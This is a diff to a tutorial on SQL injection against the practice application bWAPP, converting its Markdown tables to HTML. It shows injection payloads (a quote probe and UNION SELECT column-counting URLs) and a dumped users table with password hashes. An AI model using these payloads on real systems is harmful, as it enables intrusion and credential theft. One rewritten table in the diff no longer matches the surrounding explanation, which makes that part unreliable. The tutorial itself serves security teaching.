@@ -108,11 +108,8 @@ This form contains two input variables:
 
 We can also confirm that there are no hidden inputs and that the data is submitted through a GET request. This is reflected in the URL when we use the search function. Go back to **bwapp/sqli_1.php**, then enter "test" into the search form and click **Search**:
 
-{:style="text-align: center;"}
-```url
-bwapp/sqli_1.php?title=test&action=search
-
-```
+{:style="overflow: auto; white-space: nowrap;"}
+`bwapp/sqli_1.php?title=test&action=search`
 
 For other request methods, you may need to use a proxy server, such as the one available in the free and open source application [ZAP](https://github.com/zaproxy/zaproxy), to see and edit the data being transferred.
 
@@ -122,12 +119,41 @@ Now that all of the inputs within our scope have been identified, we can try to 
 
 Alter the **bwapp/sqli_i.php** URL to perform the following tests on the **title** parameter:
 
-URL Parameters                | Result
+<!-- URL Parameters                | Result
 ------------------------------|---------------------------------------------------------------------------------
 ?title=1&action=search        | 'No movies were found!' is returned.
 ?title=&action=search         | Presumably all movies are returned.
 ?action=search                | Nothing is returned.
-<span style="white-space: nowrap;">?title=iron&action=search</span> | Presumably all movies containing the word 'the' (case-insensitive) are returned.
+<span style="white-space: nowrap;">?title=iron&action=search</span> | Presumably all movies containing the word 'the' (case-insensitive) are returned. -->
+
+<div class="no-overflow">
+<table>
+  <thead>
+    <tr>
+      <th>URL Parameters</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>?title=1&amp;action=search</td>
+      <td>‘No movies were found!’ is returned.</td>
+    </tr>
+    <tr>
+      <td>?title=&amp;action=search</td>
+      <td>Presumably all movies are returned.</td>
+    </tr>
+    <tr>
+      <td>?action=search</td>
+      <td>Nothing is returned.</td>
+    </tr>
+    <tr>
+      <td><span style="white-space: nowrap;">?title=iron&amp;action=search</span></td>
+      <td>Presumably all movies containing the word ‘the’ (case-insensitive) are returned.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
 
 Given these results, we can determine that the **title** variable is being used in an SQL query that probably looks similar to: 
 
@@ -159,10 +185,39 @@ In this section, we're injecting SQL into the URL's **title** parameter. Since *
 
 >**NOTE**: The URL encoding of `'` is `%27` and `"` is `%22`.
 
-URL Parameters         | Result
+<!-- URL Parameters         | Result
 -----------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <span style="white-space: nowrap;">?title=%27&action=search</span> | 'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1' is returned.
-<span style="white-space: nowrap;">?title=%22&action=search</span> | 'No movies were found!' is returned.
+<span style="white-space: nowrap;">?title=%22&action=search</span> | 'No movies were found!' is returned. -->
+
+<div class="no-overflow">
+<table>
+  <thead>
+    <tr>
+      <th>URL Parameters</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>?title=&amp;action=1</td>
+      <td>Presumably all movies are returned.</td>
+    </tr>
+    <tr>
+      <td>?title=&amp;action=test</td>
+      <td>Presumably all movies are returned.</td>
+    </tr>
+    <tr>
+      <td>?title=&amp;action=</td>
+      <td>Presumably all movies are returned.</td>
+    </tr>
+    <tr>
+      <td>?title=</td>
+      <td>Presumably all movies are returned.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
 
 The application returns a MySQL error indicating the single quote is being interpreted as code and breaks the query:
 
@@ -304,12 +359,41 @@ A union statement must meet two requirements to be successful:
 
 The movie table has 5 columns displayed in the application, so modify the URL to union a select statement with 5 columns. If an error is returned, add an additional column. Continue to add and submit columns to the select statement until the query is successful.
 
+<!-- ===========================================================================================
+Blows out viewport
 
 URL Parameters                                  | Result
 ------------------------------------------------|--------------------------------------------------------------------------------------------
 ?title=%27UNION+SELECT+1,2,3,4,5+-\-+&action=search     | 'Error: The used SELECT statements have a different number of columns' is returned.
 ?title=%27UNION+SELECT+1,2,3,4,5,6+-\-+&action=search   | 'Error: The used SELECT statements have a different number of columns' is returned.
-?title=%27UNION+SELECT+1,2,3,4,5,6,7+-\-+&action=search | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.
+?title=%27UNION+SELECT+1,2,3,4,5,6,7+-\-+&action=search | Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4. -->
+
+<div class="no-overflow">
+<table>
+  <thead>
+    <tr>
+      <th>URL Parameters</th>
+      <th>Result</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>?title=%27UNION+SELECT+1,2,3,4,5+--+&amp;action=search</td>
+      <td>‘Error: The used SELECT statements have a different number of columns’ is returned.</td>
+    </tr>
+    <tr>
+      <td>?title=%27UNION+SELECT+1,2,3,4,5,6+--+&amp;action=search</td>
+      <td>‘Error: The used SELECT statements have a different number of columns’ is returned.</td>
+    </tr>
+    <tr>
+      <td>?title=%27UNION+SELECT+1,2,3,4,5,6,7+--+&amp;action=search</td>
+      <td>Presumably all movies are returned followed by a row containing the numbers 2, 3, 5, and 4.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- =============================================================================== -->
 
 This indicates that the table which the application is querying contains 7 columns, but only 4 of those columns are displayed within the application itself. Columns 2, 5, and 4, allow text data type. Column 3 is either a number or text data type. 
 
@@ -416,10 +500,43 @@ The **users** table has 11 columns, but we only have four columns to work with. 
 
 Results:
 
+<!-- =================================================================================
+Blows out view port if not html.
+
 login | admin | email                    | password
 ------|-------|--------------------------|-----------------------------------------
 A.I.M | 1     | bwapp-aim@mailinator.com | 6885858486f31043e5839c735d99457f045affd0
-bee   | 1     | bwapp-bee@mailinator.com | 6885858486f31043e5839c735d99457f045affd0
+bee   | 1     | bwapp-bee@mailinator.com | 6885858486f31043e5839c735d99457f045affd0 -->
+
+<div class="no-overflow">
+<table style="overflow: auto;">
+  <thead>
+    <tr>
+      <th>login</th>
+      <th>admin</th>
+      <th>email</th>
+      <th>password</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>A.I.M</td>
+      <td>1</td>
+      <td>bwapp-aim@mailinator.com</td>
+      <td>6885858486f31043e5839c735d99457f045affd0</td>
+    </tr>
+    <tr>
+      <td>bee</td>
+      <td>1</td>
+      <td>bwapp-bee@mailinator.com</td>
+      <td>6885858486f31043e5839c735d99457f045affd0</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- ================================================================================= -->
+
 
 A malicious user could attempt to decrypt the hashed passwords with tools like John the Ripper or THC Hydra. 
 
